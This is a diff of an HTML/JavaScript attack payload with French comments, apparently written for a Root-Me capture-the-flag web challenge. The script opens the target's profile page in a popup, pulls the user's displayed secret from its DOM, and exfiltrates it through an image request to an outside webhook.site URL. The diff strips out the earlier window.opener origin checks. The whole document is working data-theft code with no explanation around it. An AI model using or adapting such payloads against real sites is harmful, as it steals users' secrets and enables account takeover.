@@ -1,16 +1,13 @@
+<html>
 <script>
+// Ouvrir la popup
+var win = window.open('http://challenge01.root-me.org:58003/profile', '_blank');
+
+// Attendre que la popup se charge
 setTimeout(function() {
     try {
-        // Vérifier si window.opener est accessible
-        if (!window.opener) {
-            throw new Error('window.opener is null');
-        }
-        // Vérifier same-origin
-        if (window.opener.origin !== window.origin) {
-            throw new Error('Different origins: ' + window.opener.origin + ' vs ' + window.origin);
-        }
-        // Extraire le secret
-        var secret = window.opener.document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
+        // Accéder au DOM de la popup
+        var secret = win.document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
         // Exfiltrer
         new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
     } catch(e) {
@@ -19,3 +16,4 @@ setTimeout(function() {
     }
 }, 2000);
 </script>
+</html>
